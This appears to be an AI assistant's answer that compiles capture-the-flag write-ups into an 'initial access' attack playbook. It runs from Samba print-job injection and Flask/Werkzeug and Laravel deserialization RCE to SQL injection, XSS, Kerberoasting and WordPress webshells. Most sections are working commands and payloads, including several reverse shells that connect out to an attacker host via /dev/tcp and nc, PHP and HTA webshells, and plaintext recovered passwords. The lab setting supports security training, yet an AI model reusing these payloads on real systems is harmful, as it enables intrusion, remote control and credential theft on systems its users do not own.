I’ll extract the initial access chains across the uploaded write-ups and consolidate them into one combined Phase 2 guide.




















# Combined Pentest Holy Grail — Phase 2: Initial Access

This is a **combined initial access reference** synthesized across the uploaded write-ups.  
It is organized by **specific service / software / vulnerability / logic flaw**, not by box.

Each section includes:
- vulnerability/vector
- how it was identified
- exact commands/payloads
- expected result / success indicators

---

# 1. Samba Printer Share RCE via Print Job Name Injection  
## Service / Software
- SMB printer share
- Samba printing subsystem

## Vulnerability
- **CVE-2026-4480**
- command injection via `%J` in `print command`

## Core Logic
A client-controlled print job name is passed unsafely into a shell command in Samba’s print subsystem.  
If the job name contains shell metacharacters, attacker-controlled content executes.

## Identification Clues
- Anonymous access to a **printer share**
- `smbclient` shows `print <filename>`
- later config revealed:
```ini
print command = /usr/local/bin/printaudit %J %s
```

## Exploitation Steps

### Confirm with ICMP
```bash
echo 'ping -c 1 10.10.15.243' > '|sh'
smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
sudo tcpdump -ni tun0 icmp
```

### Expected result
```text
ICMP echo request from target
```

### Reverse shell
```bash
echo 'bash -i >& /dev/tcp/10.10.15.243/443 0>&1' > '|bash'
smbclient //10.129.244.177/HP-Reception -N -c 'print "|bash"'
nc -lnvp 443
```

### Success indicator
```text
nobody@abducted:/var/spool/samba$
```

## Shell stabilization
```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
reset
```

---

# 2. Flask File Read + Werkzeug Debug Console RCE  
## Service / Software
- HTTP web app
- Flask / Werkzeug debug mode

## Vulnerability
- arbitrary file read / directory traversal
- Flask debug console exposure
- PIN reconstruction leading to RCE

## Core Logic
A file read bug exposed local files. A bad file path caused a Flask debug crash page.  
By using file read to collect values needed for Werkzeug PIN generation, the debug console could be unlocked and abused for code execution.

## Identification Clues
- Export/download flow:
  - `/vault/export`
  - redirect to `/download?fn=...`
- path manipulation returned files
- invalid path triggered Flask debug error page
- terminal icon on debug page prompted for PIN

## Enumeration used to support exploit
```bash
# file read via vulnerable download parameter
# read /proc/self/environ
# read app path from stack trace / crash
```

## Exploit Workflow
1. Trigger file read
2. Trigger debug page
3. Collect PIN-generation inputs:
   - username
   - module name
   - app/class name
   - path to Flask app file
4. Generate Werkzeug PIN
5. Unlock console
6. Execute reverse shell

## Success indicator
```text
uid=33(www-data) gid=33(www-data)
```

## Post-exploit note
Shell was short-lived (~5 minutes), so quick pivoting mattered.

---

# 3. Laravel Registration Role Manipulation → Admin Access  
## Service / Software
- PHP web app
- custom registration/admin panel

## Vulnerability
- insecure role assignment
- client-controlled `roleid`

## Core Logic
Registration form included a hidden/unguarded `roleid` parameter.  
Changing it from standard user to admin granted access to `/admin.php`.

## Identification Clues
Intercepted registration request showed:
```http
uid=0xdf&password=0xdf&confirm=0xdf&roleid=0
```

## Exploitation Steps

### Original request
```http
POST /register.php
...
uid=0xdf&password=0xdf&confirm=0xdf&roleid=0
```

### Modified request in Burp
```http
POST /register.php
...
uid=0xdfadmin&password=0xdf&confirm=0xdf&roleid=1
```

## Expected result
- new account created
- account can log in at:
```text
/admin.php
```

## Follow-on access
Admin interface exposed:
- `dev-staging-01.academy.htb`

This became the real foothold path.

---

# 4. Laravel Debug Leakage + APP_KEY → Deserialization RCE  
## Service / Software
- Laravel
- vulnerable debug/error page

## Vulnerability
- **CVE-2018-15133**
- Laravel token unserialize RCE
- requires `APP_KEY`

## Core Logic
A crashing Laravel vhost leaked the `APP_KEY`.  
That key enabled crafting a malicious serialized token/cookie/header to get RCE.

## Identification Clues
- subdomain discovered from admin panel:
```text
dev-staging-01.academy.htb
```
- HTTP 500 page with Laravel debugging
- `APP_KEY` leaked in server data

## Exploitation Option A — Metasploit

```bash
msfconsole
use exploit/unix/http/laravel_token_unserialize_exec
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set RHOSTS 10.10.10.215
set vhost dev-staging-01.academy.htb
set LHOST tun0
set LPORT 443
run
```

### Success indicator
```text
Command shell session opened
uid=33(www-data) gid=33(www-data)
```

## Exploitation Option B — Manual payload in cookie/header

### Generate payload
Modified PHP payload generator to use:
- leaked `APP_KEY`
- base64 reverse shell
- `phpggc`

### Trigger with cookie
```bash
curl -s -H "Cookie: laravel_session=$(php gen_serialized.php);" http://dev-staging-01.academy.htb
```

### Or trigger with header
```bash
curl -s -X POST -H "X-XSRF-TOKEN: $(php gen_serialized.php);" http://dev-staging-01.academy.htb
```

### Listener
```bash
sudo nc -lnvp 443
```

### Success indicator
```text
www-data@academy:/$ id
uid=33(www-data) gid=33(www-data)
```

---

# 5. Audio-to-SQL Injection → Credential Dump → SSH  
## Service / Software
- custom WAV upload app
- speech recognition to SQL query backend

## Vulnerability
- SQL injection via speech-to-text pipeline

## Core Logic
The app converted uploaded speech into text, normalized spoken symbols/keywords, and inserted the result into an SQL query unsafely.

## Identification Clues
Saying “open single quote” caused SQL syntax error.

## Tooling / Automation
### Generate WAV
```bash
flite -w /tmp/test.wav -voice rms -t "hello world"
```

### Submit WAV
```bash
curl -s -X POST http://10.10.10.163/ai.php \
  -F 'fileToUpload=@/tmp/test.wav;type=audio/x-wav' \
  -F 'submit=Process It!'
```

### Helper script
```bash
#!/bin/bash
flite -w /tmp/test.wav -voice rms -t "$1"
out=$(curl -s -X POST http://10.10.10.163/ai.php -F 'fileToUpload=@/tmp/test.wav;type=audio/x-wav' -F 'submit=Process It!' -x http://127.0.0.1:8080 | perl -0777 -ne '/<h3>(.*)<h3>/ && print $1,"\n";')
echo -e "${out/<br \/>/\\n}"
```

## Exploitation

### Confirm SQLi
```bash
./query_ai.sh "open single quote"
```

### Example version extraction
```bash
./query_ai.sh "open single quote space union select version open parenthesis close parenthesis comment database"
```

### Dump username
```bash
./query_ai.sh "open single quote space union select space username space from users comment database"
```

### Dump password
```bash
./query_ai.sh "open single quote space union select space password space from users comment database"
```

## Credentials recovered
```text
username: alexa
password: H,Sq9t6}a<)?q93_
```

## Access
```bash
ssh alexa@10.10.10.163
```

### Success indicator
```text
alexa@AI:~$
```

---

# 6. ASP Injection / SSTI in Preview Workflow  
## Service / Software
- IIS / classic ASP application

## Vulnerability
- server-side ASP code injection
- effectively SSTI / server-side code execution

## Core Logic
User-controlled content was being written into an ASP-rendered file and later included in the preview flow.  
Injecting ASP code blocks caused server-side execution.

## Identification Clues
- form submission stored and reflected in `test.asp` / `preview.asp`
- XSS worked, but no external admin callback
- ASP syntax test:
```asp
<%= "testing execution" %>
```
executed server-side

## Code execution PoC
```asp
<%
Set shell = CreateObject("WScript.Shell")
Set proc = shell.exec("whoami")
Response.Write(proc.StdOut.ReadAll)
%>
```

## Expected result
Preview page returns:
```text
nt authority\system
```
or webserver account context, depending on execution location

## Initial foothold result
- shell as **SYSTEM in webserver container/context**

---

# 7. ThemeBleed RCE via Malicious Theme Package  
## Service / Software
- Windows theme upload/review workflow

## Vulnerability
- **CVE-2023-38146**
- ThemeBleed
- race condition involving `_vrf.dll`

## Core Logic
Theme files referencing version `999` create a window between signature verification and DLL load.  
Attacker replaces the verified style DLL with a malicious payload and obtains execution when theme is opened/tested.

## Identification Clues
- site accepts `.theme` / `.themepack`
- says uploaded themes will be tested
- Windows 11 theme hub
- external user interaction implied

## Enumeration / prep
```bash
find . -type f -exec file {} \;
```

## POC components identified
- `ThemeBleed.exe`
- `stage_1`
- `stage_2`
- `stage_3`

## Practical note
The uploaded theme had to be opened/processed by the victim system.

## Success outcome
- shell as `sam.emerson`

## Pitfall
If shell lands in weird context:
```text
Starting the CLR failed with HRESULT 8013104a.
```
Kill/retry/revert if Control Panel/theme state is stuck.

---

# 8. HTML Injection / XSS → Admin Click → Internal File Read / Credential Theft  
## Service / Software
- markdown-to-HTML viewer
- contact form with admin review

## Vulnerability
- HTML injection / stored XSS
- admin interaction with attacker content

## Core Logic
Markdown allowed embedded HTML/JS.  
Admin reviewed contact links / rendered shared markdown, enabling XSS-assisted internal access.

## XSS proof payloads
```html
### local XSS
<img src=x onerror=alert(1) />

### load image
<img src="http://10.10.14.6/image.png" />

### load script
<script src="http://10.10.14.6/script.js"></script>
```

## Observe local render callback
Run listener:
```bash
python -m http.server 80
```

Expected requests:
```text
GET /image.png
GET /script.js
```

## Verify admin click path
Send phishing/contact message with attacker URL.

Expected callback:
```text
10.10.11.44 - - "GET /phish HTTP/1.1" 404 -
```

## Outcome
- admin interaction confirmed
- later leveraged to access protected/internal resources and recover creds for SSH

## Success indicator
Eventually obtained:
- user `albert`
- SSH password `manchesterunited`

```bash
sshpass -p manchesterunited ssh albert@alert.htb
```

---

# 9. FTP Loot → Source / Credential Harvest → Web DB Pivot  
## Service / Software
- FTP with recovered creds
- exposed website source archive

## Vulnerability
- credential disclosure in downloaded source/configs
- weak segregation between old source and active secrets

## Core Logic
Recovered FTP credentials allowed download of archived site content.  
Source files disclosed database / web admin information, which enabled the next stage.

## Commands
```bash
wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187
tar ztf html.tar.gz --exclude "*/*"
```

## Loot
- `dump.sql`
- `html.tar.gz`

## Source findings
Inside `index.php`:
```php
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A\"d6b";
$dbname = "admirerdb";
```

Inside `db_admin.php`:
```php
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?"
```

## Outcome
These disclosures enabled later pivoting into Adminer / DB abuse.

---

# 10. Password Reset Brute Force Bypass via Header-Based Rate Limit Evasion  
## Service / Software
- Laravel password reset workflow

## Vulnerability
- weak 4-digit PIN
- rate limiting bypass by spoofing origin IP header
- session/cookie-bound reset flow

## Core Logic
The reset API enforced rate limiting based on an IP-related header.  
By rotating spoofed `X-Originating-IP` values, the 4-digit PIN could be brute forced.

## Attack setup
```bash
wfuzz -u http://10.10.11.159/api/resettoken \
  -d "name=big0us&pin=FUZZ" \
  -z range,0000-9999 \
  -H "Cookie: XSRF-TOKEN=<...>; laravel_session=<...>" \
  --hh 5341 \
  -w ips \
  -H "X-Originating-IP: FUZ2Z" \
  -m zip
```

## Notes
- valid username required first
- session cookie important
- brute force was noisy / needed filtering

## Follow-on
After reset/PIN success and further abuse:
- app access
- SQL injection
- webshell / shell as `www-data`

---

# 11. Adminer OneClick Login + SSRF  
## Service / Software
- Adminer
- OneClick Login plugin

## Vulnerability
- **CVE-2021-21311**
- SSRF via Adminer driver switching / backend request abuse

## Core Logic
OneClick Login removed normal authentication friction.  
By intercepting the login POST and changing the DB driver/server, the backend could be coerced into making requests on the attacker’s behalf.

## Identification Clues
- Adminer plugin directory listing exposed `oneclick-login.php`
- OneClick Login explained why no password was needed

## Intercepted POST edited in Burp
Original auth POST included:
```text
auth[driver]=server
auth[server]=localhost
auth[username]=admirer_ro
auth[password]=1w4nn4b...
```

Modified to:
- `auth[driver]=elastic`
- `auth[server]=<attacker_ip>`

## Redirect-based SSRF strategy
Because only host/IP was controllable directly:
- point Adminer at attacker server
- attacker server issues `301` redirect
- backend follows redirect to full internal target URL

## Outcome
- SSRF reached internal OpenTSDB
- chained into command injection
- foothold as `opentsdb`

---

# 12. Anonymous FTP + MDB/PST Analysis → Telnet Credentials  
## Service / Software
- FTP
- Microsoft Access DB
- Outlook PST
- Telnet

## Vulnerability
- anonymous file access
- sensitive data in backup artefacts
- password reuse / poor storage

## Core Logic
Anonymous FTP exposed:
- an MDB backup
- a password-protected zip with a PST

Password recovered from MDB unlocked the zip/PST, which contained credentials for telnet access.

## Commands
```bash
ftp 10.10.10.98
bin
get backup.mdb
get "Access Control.zip"
unzip -l Access\ Control.zip
7z x Access\ Control.zip
```

## Findings
- `Access Control.zip` required password
- `backup.mdb` was mined for the password
- PST contents revealed credentials for a user on the box

## Outcome
- telnet login as `security`

---

# 13. Grafana Arbitrary File Read → Config Creds → SSH  
## Service / Software
- Grafana

## Vulnerability
- **CVE-2021-43798**
- directory traversal / arbitrary file read

## Core Logic
Grafana plugin path traversal allowed arbitrary local file reads.  
Config files leaked admin and DB credentials, which led to developer credentials and SSH.

## Identification
```bash
searchsploit grafana
searchsploit -m multiple/webapps/50581.py
```

## Exploit shape
The exploit constructed URLs like:
```python
/public/plugins/<plugin>/../../../../../../../../../../../../..<file_to_read>
```

## Follow-on outcome
Recovered credential:
```text
anEnglishManInNewYork027468
```

Used for:
```bash
sshpass -p 'anEnglishManInNewYork027468' ssh developer@10.10.11.183
```

### Success indicator
```text
developer@ambassador:~$
```

---

# 14. Provided AD Credentials → Immediate WinRM Foothold  
## Service / Software
- WinRM
- Active Directory target with provided creds

## Vector
- valid initial creds supplied by scenario

## Commands
```bash
netexec smb 10.10.11.42 -u olivia -p ichliebedich
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
evil-winrm -i administrator.htb -u olivia -p ichliebedich
```

## Findings
- creds valid for SMB and WinRM
- invalid for FTP

## Success indicator
```text
*Evil-WinRM* PS C:\Users\olivia\Documents>
```

## Takeaway
This is not an exploit chain, but a **realistic assume-breach foothold model**.

---

# 15. Kerberoasting / TGS Crack → Administrator Access  
## Service / Software
- Active Directory / Kerberos

## Vector
- valid low-priv domain creds
- Kerberoast service ticket crack

## Core Logic
Authenticated domain user requested service ticket for a service account-backed SPN.  
Offline crack revealed high-value password.

## Commands
```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
cat GetUserSPNs.out
hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
```

## Result
Cracked password:
```text
Ticketmaster1968
```

## Follow-on
Used to access admin shares / SYSTEM later.

---

# 16. WordPress Credential Brute Force → Theme Editor Webshell  
## Service / Software
- WordPress

## Vulnerability
- credential discovery from custom wordlist / stego chain
- authenticated code execution through theme editor

## Credential discovery
```bash
wpscan --url http://apocalyst.htb --passwords list.txt --usernames falaraki
```

## Valid creds
```text
Username: falaraki
Password: Transclisiation
```

## Exploitation path
Login to `/wp-admin`, then edit theme 404 template.

### Test payload
```php
<?php
if (isset($_REQUEST['0xdf'])){ echo '0xdf'; }
```

### Confirm execution
```bash
curl -s 'http://apocalyst.htb/?p=8&0xdf=1' | head
```

### Webshell payload
```php
<?php if (isset($_REQUEST['0xdf'])){ system($_REQUEST['0xdf']); echo "\n";} ?>
```

### Confirm command exec
```bash
curl -s 'http://apocalyst.htb/?p=8&0xdf=id' | head -3
```

### Reverse shell
```bash
curl -s 'http://apocalyst.htb/?p=8' --data-urlencode '0xdf=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 443 >/tmp/f'
```

### Listener
```bash
sudo nc -lnvp 443
```

### Success indicator
```text
www-data@apocalyst:/var/www/html/apocalyst.htb$
```

---

# 17. LDAP Injection → Shared Account Password → Admin Panel Upload → Webshell / HTA  
## Service / Software
- PHP app backed by LDAP
- internal dashboard with upload feature

## Vulnerability
- LDAP injection
- admin-panel upload abuse
- PHP webshell or HTA execution

## Core Logic
LDAP search accepted wildcard/injected filters.  
Brute forcing usernames and querying descriptive fields recovered a password for a shared account.  
That account accessed admin/dashboard upload, where either PHP shell or HTA yielded execution.

## LDAP injection clues
- `*` acted as wildcard
- queries like `b*`, `b*m`, etc changed output

## Workflow
1. identify LDAP-like table behavior
2. brute force usernames via script
3. query `description` field for secrets
4. authenticate to dashboard/admin
5. upload shell payload

## PHP webshell method
```php
<?php system($_REQUEST['cmd']); ?>
```

Upload to dashboard and call it.

### Reverse shell
Use revshells.com PowerShell payload through `cmd` parameter.

### Listener
```bash
sudo rlwrap -cAr nc -lvnp 443
```

### Success indicator
```text
PS C:\inetpub\internal\dashboard\uploads> whoami
analysis\svc_web
```

## HTA method
```html
<!DOCTYPE html>
<html>
<body>
 <script type="text/vbscript">
 Dim shell
 Set shell = CreateObject("WScript.Shell")
 shell.Run "powershell -e <base64_payload>", 0, False
 </script>
</body>
</html>
```

Upload HTA, trigger it, receive shell.

---

# 18. SNMP Credential Disclosure → SSH  
## Service / Software
- SNMP
- SSH

## Vector
- sensitive password disclosed in SNMP system description

## Commands
```bash
onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.129.244.98
snmpwalk -v 2c -c public 10.129.244.98
sshpass -p RxBlZhLmOkacNWScmZ6D ssh consultant@10.129.244.98
```

## Recovered password
```text
RxBlZhLmOkacNWScmZ6D
```

## Success indicator
```text
consultant@AirTouch-Consultant:~$
```

---

# 19. Rogue AP / Captured Cookies / Client-Side Role Cookie Abuse → Upload RCE  
## Service / Software
- web app behind wireless segment
- cookie-controlled role gating
- upload feature

## Vector
- capture session traffic / cookies from decrypted Wi-Fi traffic
- abuse client-side role cookie
- bypass PHP upload filter with `.phtml`

## Core Logic
Wireless capture/decryption yielded session cookies to a router/AP management interface.  
Role authorization was controlled by a client-side cookie, enabling access to admin upload.  
A `.phtml` payload bypassed extension filtering and executed.

## Follow-on outcome
- shell as `www-data@AirTouch-AP-PSK`

## Success indicator
```text
www-data@AirTouch-AP-PSK:/var/www/html/uploads$
```

---

# 20. Telnet Appliance Command Interface → Reverse Shell  
## Service / Software
- HP JetDirect telnet service

## Vector
- password leaked via SNMP
- built-in `exec` command

## Commands

### Authenticate
```bash
telnet 10.10.11.107
# password: P@ssw0rd@123!!123
```

### Help
```text
?
```

### Confirm code execution
```text
exec id
```

Expected:
```text
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

### Reverse shell
After confirming bash exists:
```text
exec which bash
```

Then:
```text
exec bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
```

### Listener
```bash
nc -lnvp 443
```

### Success indicator
```text
lp@antique:~$
```

---

# 21. Immediate Credential Reuse from Web / Source / DB / Comments

A recurring initial-access class across multiple write-ups was **password reuse** or **credential exposure in source/config/comments**.

## Reusable patterns observed
- DB password in source/archive
- hardcoded creds in PHP
- commented-out creds in config
- password in LDAP description
- password in SNMP banner
- password in Word/PDF/documentation
- password in old source tree / backup tarball
- password in database row
- password in Outlook/backup artefacts

## Examples
- `Aero` / `Acute` / `AirTouch` / `Analysis` / `AdmirerToo` / `Ambassador` all relied on some form of credential recovery then service login.

---

# 22. Initial Access Success Indicators Cheat Sheet

| Method | Success Indicator |
|---|---|
| Samba print RCE | reverse shell as `nobody` |
| Flask debug RCE | shell as `www-data` |
| Laravel APP_KEY RCE | reverse shell / `www-data` |
| SQLi to creds | valid SSH login |
| ASP injection | command output / reverse shell |
| ThemeBleed | shell as desktop user |
| XSS/admin click path | external callback from target/admin |
| Adminer SSRF chain | internal app reachability / shell as service user |
| WordPress theme editor | `id` through webshell |
| LDAP injection | enumerated usernames / leaked description password |
| SNMP leak | successful SSH |
| Telnet appliance | `exec id` / reverse shell |

---

# 23. Initial Access Pitfalls and Operator Notes

## Web
- If a debug console asks for a PIN, don’t stop at “needs auth” — look for local file read
- If app behavior differs by response size only, use `wfuzz`/`ffuf` filters
- If upload form checks only extension client-side, assume backend may be weak too

## Windows
- User interaction attacks often need patience:
  - theme testing
  - admin reviewing messages
  - scheduled software install / script execution
- If obtained shell is unstable or weird (e.g. Aero), retry cleanly

## SMB / Telnet / Printer
- Printer shares are not dead ends
- SNMP on appliances frequently leaks defaults
- Telnet “help” output often exposes command exec primitives directly

## Credentials
- Always test recovered creds across:
  - SSH
  - SMB
  - WinRM
  - FTP
  - web logins
  - DB logins
- But don’t assume all protocols accept the same creds

---

If you want, next I can continue with:

# **Combined Pentest Holy Grail — Phase 3: Privilege Escalation (Service to User)**

in the same merged format.
